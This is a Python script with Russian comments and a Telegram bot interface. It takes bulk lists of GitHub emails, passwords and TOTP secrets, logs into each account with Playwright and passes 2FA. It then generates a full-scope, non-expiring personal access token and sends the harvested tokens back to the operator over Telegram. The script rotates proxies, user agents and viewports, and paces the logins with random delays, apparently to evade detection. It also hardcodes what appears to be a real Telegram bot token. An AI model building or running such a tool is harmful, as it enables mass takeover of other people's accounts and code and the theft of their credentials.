#!/usr/bin/env python3
"""
Режимы:
  1) Локально:  python main.py <папка_с_txt>
  2) Telegram:  python main.py --bot
"""
import re
import sys
import time
import random
import json
from pathlib import Path
from urllib.parse import urlparse

import pyotp
import requests
from playwright.sync_api import sync_playwright

# ================= НАСТРОЙКИ =================
HEADLESS = True
SLOW_MO = 80
TOKEN_NOTE = "full"

DEFAULT_DELAY_MIN = 40
DEFAULT_DELAY_MAX = 70

LOGIN_WAIT = 4.0
OTP_WAIT = 3.0
PAGE_LOAD_TIMEOUT = 45000
NAV_TIMEOUT = 30000
CLICK_TIMEOUT = 10000

TELEGRAM_BOT_TOKEN = "8921106312:AAHHKCCGQp5QGt-CtqEPQkURzEC3YKOjAys"
# ============================================

API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
SETTINGS_FILE = Path("bot_settings.json")


# ---------- Настройки ----------
def load_settings() -> dict:
    if SETTINGS_FILE.exists():
        try:
            return json.loads(SETTINGS_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {}


def save_settings(data: dict):
    SETTINGS_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")


def get_chat_settings(chat_id: int) -> dict:
    settings = load_settings()
    return settings.get(str(chat_id), {})


def get_chat_proxy(chat_id: int) -> str | None:
    return get_chat_settings(chat_id).get("proxy") or None


def set_chat_proxy(chat_id: int, proxy: str | None):
    settings = load_settings()
    key = str(chat_id)
    if key not in settings:
        settings[key] = {}
    if proxy:
        settings[key]["proxy"] = proxy.strip()
    else:
        settings[key].pop("proxy", None)
    save_settings(settings)


def get_chat_delay(chat_id: int) -> int | None:
    val = get_chat_settings(chat_id).get("delay")
    if val is None:
        return None
    try:
        return int(val)
    except Exception:
        return None


def set_chat_delay(chat_id: int, delay: int | None):
    settings = load_settings()
    key = str(chat_id)
    if key not in settings:
        settings[key] = {}
    if delay is not None and delay > 0:
        settings[key]["delay"] = int(delay)
    else:
        settings[key].pop("delay", None)
    save_settings(settings)


def parse_proxy(proxy_str: str) -> dict | None:
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    if "://" not in proxy_str:
        proxy_str = "socks5://" + proxy_str

    try:
        u = urlparse(proxy_str)
        if not u.hostname or not u.port:
            return None

        result = {
            "server": f"{u.scheme}://{u.hostname}:{u.port}"
        }
        if u.username:
            result["username"] = u.username
        if u.password:
            result["password"] = u.password
        return result
    except Exception:
        return None


# ---------- Telegram helpers ----------
def tg_send(chat_id: int, text: str, reply_markup: dict | None = None):
    payload = {
        "chat_id": chat_id,
        "text": text[:4000],
        "parse_mode": "HTML",
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(f"{API}/sendMessage", json=payload, timeout=30)
    except Exception as e:
        print(f"tg_send error: {e}")


def tg_edit(chat_id: int, message_id: int, text: str, reply_markup: dict | None = None):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text[:4000],
        "parse_mode": "HTML",
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(f"{API}/editMessageText", json=payload, timeout=30)
    except Exception as e:
        print(f"tg_edit error: {e}")


def tg_answer_callback(callback_query_id: str, text: str = ""):
    try:
        requests.post(f"{API}/answerCallbackQuery", json={
            "callback_query_id": callback_query_id,
            "text": text[:200],
        }, timeout=15)
    except Exception:
        pass


def tg_send_file(chat_id: int, content: str, filename: str = "ghp_tokens.txt"):
    try:
        requests.post(
            f"{API}/sendDocument",
            data={"chat_id": chat_id, "caption": "Готово ✅"},
            files={"document": (filename, content.encode("utf-8"))},
            timeout=60,
        )
    except Exception as e:
        print(f"tg_send_file error: {e}")


def tg_download(file_id: str) -> bytes:
    r = requests.get(f"{API}/getFile", params={"file_id": file_id}, timeout=30)
    r.raise_for_status()
    path = r.json()["result"]["file_path"]
    r2 = requests.get(f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{path}", timeout=60)
    r2.raise_for_status()
    return r2.content


def settings_keyboard(chat_id: int) -> dict:
    proxy = get_chat_proxy(chat_id)
    proxy_text = (proxy[:35] + "…") if proxy and len(proxy) > 35 else (proxy or "не задан")

    delay = get_chat_delay(chat_id)
    delay_text = f"{delay} сек" if delay else f"{DEFAULT_DELAY_MIN}-{DEFAULT_DELAY_MAX} сек (рандом)"

    return {
        "inline_keyboard": [
            [{"text": f"🌐 Прокси: {proxy_text}", "callback_data": "proxy_info"}],
            [{"text": "✏️ Установить прокси", "callback_data": "set_proxy"}],
            [{"text": "🗑 Удалить прокси", "callback_data": "del_proxy"}],
            [{"text": f"⏱ Задержка: {delay_text}", "callback_data": "delay_info"}],
            [{"text": "✏️ Установить задержку", "callback_data": "set_delay"}],
            [{"text": "🔄 Сбросить задержку", "callback_data": "del_delay"}],
            [{"text": "◀️ Закрыть", "callback_data": "close_settings"}],
        ]
    }


# ---------- Парсинг / OTP ----------
def parse_line(line: str):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    parts = line.split(":")
    if len(parts) < 5:
        return None
    return {
        "email": parts[0],
        "password": ":".join(parts[1:-3]),
        "totp": parts[-3].upper().replace(" ", ""),
        "login": parts[-1],
    }


def get_otp(secret: str) -> str:
    return pyotp.TOTP(secret).now()


# ---------- Создание токена ----------
def create_ghp(page) -> str | None:
    print("\n  >>> Создание токена...")
    try:
        page.goto("https://github.com/settings/tokens/new", wait_until="domcontentloaded", timeout=PAGE_LOAD_TIMEOUT)
        page.wait_for_selector('input[name="oauth_access[description]"]', timeout=20000)
    except Exception as e:
        print(f"  ! Не удалось открыть страницу токена: {e}")
        return None

    time.sleep(1.5)
    page.fill('input[name="oauth_access[description]"]', TOKEN_NOTE)
    time.sleep(0.8)

    # No expiration
    try:
        exp_btn = page.locator("button").filter(
            has_text=re.compile(r"\d+\s*days|No expiration|Custom", re.I)
        ).first
        exp_btn.click(timeout=CLICK_TIMEOUT)
        time.sleep(1.0)
        page.locator("text=No expiration").first.click(timeout=CLICK_TIMEOUT)
        print("  + No expiration")
        time.sleep(0.8)
    except Exception:
        print("  ! Expiration — пропускаем")

    # Все галочки
    try:
        n = page.evaluate("""
            () => {
                let c = 0;
                document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
                    if (!cb.checked) {
                        cb.checked = true;
                        cb.dispatchEvent(new Event('input',  { bubbles: true }));
                        cb.dispatchEvent(new Event('change', { bubbles: true }));
                        c++;
                    }
                });
                return c;
            }
        """)
        print(f"  + Галочек: {n}")
    except Exception as e:
        print(f"  ! Галочки: {e}")

    time.sleep(1.2)

    # Generate
    try:
        btn = page.locator("button").filter(has_text=re.compile(r"Generate token", re.I)).first
        with page.expect_navigation(wait_until="domcontentloaded", timeout=NAV_TIMEOUT):
            btn.click(timeout=CLICK_TIMEOUT)
        print("  + Generate")
    except Exception:
        try:
            page.locator("button").filter(has_text=re.compile(r"Generate token", re.I)).first.click(timeout=CLICK_TIMEOUT)
            print("  + Generate (без навигации)")
            time.sleep(3)
        except Exception as e:
            print(f"  ! Generate не найден: {e}")
            return None

    time.sleep(3.0)

    try:
        page.wait_for_selector("#new-oauth-token", timeout=15000)
        token = page.locator("#new-oauth-token").inner_text().strip()
        if token.startswith("ghp_"):
            return token
    except Exception:
        pass

    try:
        content = page.content()
        m = re.search(r'ghp_[A-Za-z0-9]{36,}', content)
        if m:
            return m.group(0)
    except Exception:
        pass

    print("  ! Токен на странице не найден")
    return None


def process(cred: dict, proxy: str | None = None) -> str | None:
    print(f"\n{'='*50}")
    print(f"Аккаунт: {cred['login']} | {cred['email']}")
    if proxy:
        print(f"Прокси: {proxy}")
    print(f"{'='*50}")

    width = random.randint(1360, 1600)
    height = random.randint(850, 1000)
    ua = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.randint(122, 131)}.0.0.0 Safari/537.36"
    )

    launch_args = {"headless": HEADLESS, "slow_mo": SLOW_MO}
    context_args = {
        "viewport": {"width": width, "height": height},
        "user_agent": ua,
        "locale": "en-US",
    }

    if proxy:
        parsed = parse_proxy(proxy)
        if parsed:
            context_args["proxy"] = parsed
            print(f"  Proxy parsed: {parsed.get('server')}")
        else:
            print(f"  ! Не удалось распарсить прокси: {proxy}")

    with sync_playwright() as p:
        browser = p.chromium.launch(**launch_args)
        context = browser.new_context(**context_args)
        page = context.new_page()
        page.set_default_timeout(CLICK_TIMEOUT)
        page.set_default_navigation_timeout(PAGE_LOAD_TIMEOUT)

        try:
            page.goto("https://github.com/login", wait_until="domcontentloaded", timeout=PAGE_LOAD_TIMEOUT)
            time.sleep(LOGIN_WAIT)

            page.fill("#login_field", cred["email"])
            time.sleep(0.6)
            page.fill("#password", cred["password"])
            time.sleep(0.6)
            page.click('input[type="submit"]')
            time.sleep(LOGIN_WAIT + 1)

            # 2FA
            if page.locator("#app_totp, input[name='app_otp']").count() > 0:
                otp = get_otp(cred["totp"])
                print(f"  OTP: {otp}")
                page.fill("#app_totp, input[name='app_otp']", otp)
                time.sleep(0.5)
                page.keyboard.press("Enter")
                try:
                    page.wait_for_url(lambda u: "two-factor" not in u, timeout=25000)
                except Exception:
                    print("  ! Не удалось выйти из 2FA")
                    return None
                time.sleep(OTP_WAIT)

            current_url = page.url
            if "login" in current_url or page.locator("#login_field").count() > 0:
                print("  ✗ Логин не прошёл")
                return None

            print("  Вход OK")
            time.sleep(1.5)
            token = create_ghp(page)

            # Logout
            try:
                page.goto("https://github.com/logout", wait_until="domcontentloaded", timeout=15000)
                time.sleep(1.0)
                confirm = page.locator('input[type="submit"][value="Sign out"], button:has-text("Sign out")')
                if confirm.count() > 0:
                    confirm.first.click(timeout=5000)
                print("  Logout OK")
            except Exception:
                pass

            if token:
                print(f"  ✓ {token}")
            else:
                print("  ✗ токен не получен")
            return token

        except Exception as e:
            print(f"  ✗ Exception: {e}")
            return None
        finally:
            try:
                context.close()
            except Exception:
                pass
            try:
                browser.close()
            except Exception:
                pass


def process_text(raw: str, proxy: str | None = None, delay_sec: int | None = None, progress_cb=None) -> list[str]:
    results = []
    lines = [ln for ln in raw.splitlines() if parse_line(ln)]
    total = len(lines)

    for i, line in enumerate(lines, 1):
        cred = parse_line(line)
        if not cred:
            continue

        if progress_cb:
            progress_cb(f"⏳ [{i}/{total}] {cred['login']}...")

        token = process(cred, proxy=proxy)
        results.append(f"{cred['login']}:{token or 'FAILED'}")

        if progress_cb:
            status = "✅" if token else "❌"
            progress_cb(f"{status} [{i}/{total}] {cred['login']}")

        if i < total:
            if delay_sec and delay_sec > 0:
                delay = delay_sec
            else:
                delay = random.uniform(DEFAULT_DELAY_MIN, DEFAULT_DELAY_MAX)

            print(f"\n  ... пауза {delay:.0f} сек ...")
            if progress_cb:
                progress_cb(f"⏳ Пауза {int(delay)} сек перед следующим...")
            time.sleep(delay)

    return results


# ---------- Локальный режим ----------
def main_local(folder: Path):
    txt_files = sorted(folder.glob("*.txt"))
    if not txt_files:
        print("Нет .txt файлов")
        sys.exit(1)

    results = []
    for txt_file in txt_files:
        print(f"\n########## {txt_file.name} ##########")
        results.extend(process_text(txt_file.read_text(encoding="utf-8")))

    out = Path("ghp_tokens.txt").resolve()
    out.write_text("\n".join(results), encoding="utf-8")
    print("\n" + "=" * 50)
    for line in results:
        print(line)
    print("=" * 50)
    print(f"Сохранено: {out}")


# ---------- Telegram бот ----------
def main_bot():
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("СЮДА"):
        print("Укажи TELEGRAM_BOT_TOKEN")
        sys.exit(1)

    print("Бот запущен. Жду файлы и команды...")
    offset = 0
    waiting_proxy = set()
    waiting_delay = set()

    while True:
        try:
            r = requests.get(f"{API}/getUpdates", params={
                "offset": offset,
                "timeout": 30,
            }, timeout=35)
            r.raise_for_status()
            updates = r.json().get("result", [])
        except Exception as e:
            print(f"getUpdates: {e}")
            time.sleep(3)
            continue

        for upd in updates:
            offset = upd["update_id"] + 1

            # ---- callback ----
            cb = upd.get("callback_query")
            if cb:
                chat_id = cb["message"]["chat"]["id"]
                msg_id = cb["message"]["message_id"]
                data = cb.get("data", "")
                cb_id = cb["id"]

                if data == "settings":
                    proxy = get_chat_proxy(chat_id) or "не задан"
                    delay = get_chat_delay(chat_id)
                    delay_text = f"{delay} сек" if delay else f"{DEFAULT_DELAY_MIN}-{DEFAULT_DELAY_MAX} сек (рандом)"
                    tg_edit(chat_id, msg_id,
                            f"⚙️ <b>Настройки</b>\n\n"
                            f"Прокси:\n<code>{proxy}</code>\n\n"
                            f"Задержка между аккаунтами: <b>{delay_text}</b>",
                            settings_keyboard(chat_id))
                    tg_answer_callback(cb_id)

                elif data == "proxy_info":
                    proxy = get_chat_proxy(chat_id) or "не задан"
                    tg_answer_callback(cb_id, f"Прокси: {proxy}")

                elif data == "set_proxy":
                    waiting_proxy.add(chat_id)
                    waiting_delay.discard(chat_id)
                    tg_edit(chat_id, msg_id,
                            "✏️ Отправь прокси одним сообщением.\n\n"
                            "Форматы:\n"
                            "<code>user:pass@host:port</code>\n"
                            "<code>socks5://user:pass@host:port</code>\n"
                            "<code>http://user:pass@host:port</code>\n\n"
                            "Или /cancel")
                    tg_answer_callback(cb_id, "Жду прокси...")

                elif data == "del_proxy":
                    set_chat_proxy(chat_id, None)
                    tg_edit(chat_id, msg_id,
                            "⚙️ <b>Настройки</b>\n\nПрокси удалён.",
                            settings_keyboard(chat_id))
                    tg_answer_callback(cb_id, "Прокси удалён")

                elif data == "delay_info":
                    delay = get_chat_delay(chat_id)
                    text = f"{delay} сек" if delay else f"{DEFAULT_DELAY_MIN}-{DEFAULT_DELAY_MAX} сек (рандом)"
                    tg_answer_callback(cb_id, f"Задержка: {text}")

                elif data == "set_delay":
                    waiting_delay.add(chat_id)
                    waiting_proxy.discard(chat_id)
                    tg_edit(chat_id, msg_id,
                            "⏱ Отправь задержку в <b>секундах</b> (целое число).\n\n"
                            "Пример: <code>50</code>\n\n"
                            "Или /cancel")
                    tg_answer_callback(cb_id, "Жду задержку...")

                elif data == "del_delay":
                    set_chat_delay(chat_id, None)
                    tg_edit(chat_id, msg_id,
                            "⚙️ <b>Настройки</b>\n\nЗадержка сброшена на стандартную (40-70 сек).",
                            settings_keyboard(chat_id))
                    tg_answer_callback(cb_id, "Задержка сброшена")

                elif data == "close_settings":
                    tg_edit(chat_id, msg_id, "Настройки закрыты.")
                    tg_answer_callback(cb_id)

                continue

            # ---- сообщения ----
            msg = upd.get("message") or upd.get("edited_message")
            if not msg:
                continue

            chat_id = msg["chat"]["id"]
            text = (msg.get("text") or "").strip()
            doc = msg.get("document")

            # Ожидание прокси
            if chat_id in waiting_proxy:
                if text.lower() in ("/cancel", "отмена"):
                    waiting_proxy.discard(chat_id)
                    tg_send(chat_id, "Отменено.", {
                        "inline_keyboard": [[{"text": "⚙️ Настройки", "callback_data": "settings"}]]
                    })
                    continue

                if text:
                    parsed = parse_proxy(text)
                    if not parsed:
                        tg_send(chat_id, "Неверный формат прокси.\nПример:\n<code>user:pass@host:port</code>")
                        continue
                    set_chat_proxy(chat_id, text)
                    waiting_proxy.discard(chat_id)
                    tg_send(chat_id, f"✅ Прокси сохранён:\n<code>{text}</code>", {
                        "inline_keyboard": [[{"text": "⚙️ Настройки", "callback_data": "settings"}]]
                    })
                    continue

            # Ожидание задержки
            if chat_id in waiting_delay:
                if text.lower() in ("/cancel", "отмена"):
                    waiting_delay.discard(chat_id)
                    tg_send(chat_id, "Отменено.", {
                        "inline_keyboard": [[{"text": "⚙️ Настройки", "callback_data": "settings"}]]
                    })
                    continue

                if text:
                    try:
                        sec = int(text)
                        if sec < 5:
                            tg_send(chat_id, "Минимум 5 секунд")
                            continue
                        if sec > 600:
                            tg_send(chat_id, "Максимум 600 секунд (10 мин)")
                            continue
                        set_chat_delay(chat_id, sec)
                        waiting_delay.discard(chat_id)
                        tg_send(chat_id, f"✅ Задержка установлена: <b>{sec} сек</b>", {
                            "inline_keyboard": [[{"text": "⚙️ Настройки", "callback_data": "settings"}]]
                        })
                    except ValueError:
                        tg_send(chat_id, "Нужно целое число (секунды).\nПример: <code>45</code>")
                    continue

            # Команды
            if text in ("/start", "/help"):
                tg_send(chat_id,
                    "Пришли .txt файл с аккаунтами\n"
                    "(формат: email:password:totp:xxx:login)\n\n"
                    "Бот обработает и пришлёт ghp_tokens.txt\n\n"
                    "В настройках можно задать прокси и задержку.",
                    {
                        "inline_keyboard": [
                            [{"text": "⚙️ Настройки", "callback_data": "settings"}]
                        ]
                    })
                continue

            if text == "/settings":
                proxy = get_chat_proxy(chat_id) or "не задан"
                delay = get_chat_delay(chat_id)
                delay_text = f"{delay} сек" if delay else f"{DEFAULT_DELAY_MIN}-{DEFAULT_DELAY_MAX} сек (рандом)"
                tg_send(chat_id,
                        f"⚙️ <b>Настройки</b>\n\n"
                        f"Прокси:\n<code>{proxy}</code>\n\n"
                        f"Задержка: <b>{delay_text}</b>",
                        settings_keyboard(chat_id))
                continue

            if not doc:
                if text:
                    tg_send(chat_id, "Пришли .txt файл или нажми ⚙️ Настройки", {
                        "inline_keyboard": [[{"text": "⚙️ Настройки", "callback_data": "settings"}]]
                    })
                continue

            fname = doc.get("file_name") or ""
            if not fname.lower().endswith(".txt"):
                tg_send(chat_id, "Нужен файл .txt")
                continue

            proxy = get_chat_proxy(chat_id)
            delay = get_chat_delay(chat_id)

            proxy_info = f"\nПрокси: <code>{proxy}</code>" if proxy else "\nПрокси: не задан"
            delay_info = f"\nЗадержка: <b>{delay} сек</b>" if delay else f"\nЗадержка: {DEFAULT_DELAY_MIN}-{DEFAULT_DELAY_MAX} сек"

            tg_send(chat_id, f"📥 Получил {fname}, начинаю...{proxy_info}{delay_info}")
            try:
                raw = tg_download(doc["file_id"]).decode("utf-8", errors="ignore")
            except Exception as e:
                tg_send(chat_id, f"Ошибка скачивания: {e}")
                continue

            creds = [ln for ln in raw.splitlines() if parse_line(ln)]
            if not creds:
                tg_send(chat_id, "В файле нет валидных строк")
                continue

            tg_send(chat_id, f"Найдено аккаунтов: {len(creds)}")

            def progress(t):
                tg_send(chat_id, t)

            results = process_text(raw, proxy=proxy, delay_sec=delay, progress_cb=progress)
            body = "\n".join(results)
            tg_send(chat_id, "Итог:\n" + body[:3500])
            tg_send_file(chat_id, body, "ghp_tokens.txt")
            print(f"Готово для chat {chat_id}")


if __name__ == "__main__":
    if len(sys.argv) >= 2 and sys.argv[1] == "--bot":
        main_bot()
    elif len(sys.argv) >= 2:
        main_local(Path(sys.argv[1]))
    else:
        print("Локально:  python main.py <папка>")
        print("Telegram:  python main.py --bot")
        sys.exit(1)